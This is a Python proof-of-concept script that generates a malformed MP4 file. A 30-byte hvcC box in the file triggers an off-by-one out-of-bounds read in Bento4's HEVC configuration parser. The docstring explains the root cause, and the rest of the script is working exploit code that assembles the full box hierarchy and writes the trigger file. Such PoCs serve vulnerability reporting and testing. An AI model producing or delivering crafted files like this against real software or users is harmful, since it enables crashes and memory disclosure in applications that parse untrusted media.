#!/usr/bin/env python3
"""
vuln_001_gen.py - Generate PoC MP4 for AP4_HvccAtom Off-by-One OOB Read
VULN 001: CWE-125 in Bento4/Source/C++/Core/Ap4HvccAtom.cpp line 282

Root cause:
  AP4_HvccAtom::Create(size=30, stream) allocates a 22-byte payload buffer
  (payload_size = 30 - 8 = 22) and reads 22 bytes from stream.
  The private constructor AP4_HvccAtom(size=30, payload):
    - computes payload_size = 22
    - guard: if (payload_size < 22) return;   <- 22 < 22 is FALSE, so no return
    - reads payload[0]..payload[21] correctly
    - line 282: AP4_UI08 num_seq = payload[22]  <- OOB READ (buffer only has 22 bytes)

Trigger: hvcC box embedded in moov/trak/mdia/minf/stbl/stsd/hvc1 with size=30.
"""

import struct
import os
import sys


def box(fourcc, data=b''):
    """Build a standard ISO box: 4-byte BE size + 4-byte fourcc + data."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, fourcc) + data


def fullbox(fourcc, version, flags, data=b''):
    """Build a FullBox: size + fourcc + version(1B) + flags(3B) + data."""
    vf = struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0xFFFFFF))
    return box(fourcc, vf + data)


# ---------------------------------------------------------------------------
# hvcC box — the trigger (size MUST be exactly 30)
# ---------------------------------------------------------------------------
# payload: exactly 22 bytes. The private constructor reads payload[0..21]
# correctly, then hits payload[22] (OOB) at line 282.
hvcc_payload = bytes([
    0x01,                              # [0]  configurationVersion = 1
    0x01,                              # [1]  profile_space=0, tier=0, profile_idc=1
    0x60, 0x00, 0x00, 0x00,           # [2-5]  profile_compatibility_flags
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # [6-11] constraint_indicator_flags
    0x00,                              # [12] level_idc = 0
    0x00, 0x00,                        # [13-14] min_spatial_segmentation = 0
    0x00,                              # [15] parallelismType = 0
    0x01,                              # [16] chromaFormat = 1 (4:2:0)
    0x00,                              # [17] bitDepthLumaMinus8 = 0
    0x00,                              # [18] bitDepthChromaMinus8 = 0
    0x00, 0x00,                        # [19-20] avgFrameRate = 0
    0x00,                              # [21] constantFrameRate|numTemporalLayers|etc = 0
    # NO byte[22]: buffer ends here; constructor reads payload[22] -> OOB
])
assert len(hvcc_payload) == 22, f"hvcc_payload must be 22 bytes, got {len(hvcc_payload)}"

# Build hvcC box with exact size=30
hvcc_box = struct.pack('>I4s', 30, b'hvcC') + hvcc_payload
assert len(hvcc_box) == 30

# ---------------------------------------------------------------------------
# hvc1 VisualSampleEntry
# ---------------------------------------------------------------------------
# VisualSampleEntry fields after SampleEntry header (70 bytes):
#   pre_defined(2) + reserved(2) + pre_defined[3](12) + width(2) + height(2)
#   + horizresolution(4) + vertresolution(4) + reserved(4) + frame_count(2)
#   + compressorname(32) + depth(2) + pre_defined(2) = 70 bytes
visual_extra = (
    struct.pack('>HH', 0, 0)             # pre_defined=0, reserved=0
    + b'\x00' * 12                        # pre_defined[3]=0
    + struct.pack('>HH', 0, 0)            # width=0, height=0
    + struct.pack('>II', 0x00480000, 0x00480000)  # horizresolution, vertresolution (72 dpi)
    + struct.pack('>I', 0)               # reserved
    + struct.pack('>H', 1)               # frame_count = 1
    + b'\x00' * 32                        # compressorname (empty)
    + struct.pack('>H', 0x0018)          # depth = 24
    + struct.pack('>h', -1)              # pre_defined = -1
)
assert len(visual_extra) == 70, f"visual_extra must be 70 bytes, got {len(visual_extra)}"

# SampleEntry header: reserved[6] + data_reference_index(2) = 8 bytes
hvc1_payload = (
    b'\x00' * 6                    # reserved[6]
    + struct.pack('>H', 1)         # data_reference_index = 1
    + visual_extra
    + hvcc_box
)

hvc1_box = box('hvc1', hvc1_payload)
# Expected: 8(box header) + 6 + 2 + 70 + 30 = 116
assert len(hvc1_box) == 116, f"hvc1_box must be 116 bytes, got {len(hvc1_box)}"

# ---------------------------------------------------------------------------
# Sample table boxes
# ---------------------------------------------------------------------------
# stsd (FullBox: version=0, flags=0, entry_count=1, entries)
stsd_box = fullbox('stsd', 0, 0, struct.pack('>I', 1) + hvc1_box)
# 4(size)+4(type)+4(version/flags)+4(entry_count)+116 = 132

# stts: time-to-sample, 0 entries
stts_box = fullbox('stts', 0, 0, struct.pack('>I', 0))
# 4+4+4+4 = 16

# stsc: sample-to-chunk, 0 entries
stsc_box = fullbox('stsc', 0, 0, struct.pack('>I', 0))
# 16

# stsz: sample sizes, sample_size=0, sample_count=0
stsz_box = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
# 4+4+4+4+4 = 20

# stco: chunk offsets, 0 entries
stco_box = fullbox('stco', 0, 0, struct.pack('>I', 0))
# 16

stbl_box = box('stbl', stsd_box + stts_box + stsc_box + stsz_box + stco_box)

# ---------------------------------------------------------------------------
# minf (Media Information Box)
# ---------------------------------------------------------------------------
# vmhd: Video Media Header (flags=1 per spec)
vmhd_box = fullbox('vmhd', 0, 1,
    struct.pack('>H', 0)   # graphicsMode = 0
    + b'\x00' * 6          # opcolor[3] = 0
)
assert len(vmhd_box) == 20

# dinf / dref
url_box = fullbox('url ', 0, 1)         # self-contained: flags=1, no location
assert len(url_box) == 12

dref_box = fullbox('dref', 0, 0, struct.pack('>I', 1) + url_box)  # entry_count=1
assert len(dref_box) == 28

dinf_box = box('dinf', dref_box)
assert len(dinf_box) == 36

minf_box = box('minf', vmhd_box + dinf_box + stbl_box)

# ---------------------------------------------------------------------------
# mdia (Media Box)
# ---------------------------------------------------------------------------
# mdhd: Media Header
mdhd_box = fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 90000, 0)  # creation, modification, timescale, duration
    + struct.pack('>HH', 0x55C4, 0)        # language='und', pre_defined=0
)
assert len(mdhd_box) == 32

# hdlr: Handler Reference
hdlr_name = b'Video\x00'
hdlr_box = fullbox('hdlr', 0, 0,
    struct.pack('>I', 0)        # pre_defined = 0
    + b'vide'                   # handler_type = 'vide'
    + b'\x00' * 12              # reserved[3]
    + hdlr_name                 # name (null-terminated)
)

mdia_box = box('mdia', mdhd_box + hdlr_box + minf_box)

# ---------------------------------------------------------------------------
# trak (Track Box)
# ---------------------------------------------------------------------------
# tkhd: Track Header (version=0, flags=3: enabled+in_movie)
tkhd_box = fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0)  # creation, modification, track_id, reserved, duration
    + b'\x00' * 8                          # reserved[2]
    + struct.pack('>HHHH', 0, 0, 0, 0)    # layer, alternate_group, volume, reserved
    + struct.pack('>9I',                   # transformation matrix (identity)
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    + struct.pack('>II', 0, 0)             # width=0, height=0
)
assert len(tkhd_box) == 92

trak_box = box('trak', tkhd_box + mdia_box)

# ---------------------------------------------------------------------------
# moov (Movie Box)
# ---------------------------------------------------------------------------
# mvhd: Movie Header (version=0, next_track_id=2)
mvhd_box = fullbox('mvhd', 0, 0,
    struct.pack('>IIIII',                  # creation, modification, timescale, duration, rate
        0, 0, 90000, 0, 0x00010000)
    + struct.pack('>H', 0x0100)           # volume = 1.0
    + b'\x00' * 10                        # reserved (2+8 bytes)
    + struct.pack('>9I',                  # matrix (identity)
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    + b'\x00' * 24                        # pre_defined[6]
    + struct.pack('>I', 2)               # next_track_id = 2
)
assert len(mvhd_box) == 108

moov_box = box('moov', mvhd_box + trak_box)

# ---------------------------------------------------------------------------
# ftyp (File Type Box)
# ---------------------------------------------------------------------------
ftyp_box = box('ftyp',
    b'isom'                    # major_brand
    + struct.pack('>I', 0)    # minor_version
    + b'isom'                  # compatible_brands[0]
)
assert len(ftyp_box) == 20

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
mp4_data = ftyp_box + moov_box

out_dir = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001.mp4')

with open(out_path, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written: {out_path} ({len(mp4_data)} bytes)")
print(f"[+] hvcC box: size=30, payload=22 bytes (indices 0-21)")
print(f"[+] Trigger: AP4_HvccAtom ctor reads payload[22] (OOB) at Ap4HvccAtom.cpp:282")
print(f"[+] Chain:   ftyp + moov/mvhd/trak/tkhd/mdia/mdhd/hdlr/minf/vmhd/dinf/stbl/stsd/hvc1/hvcC")
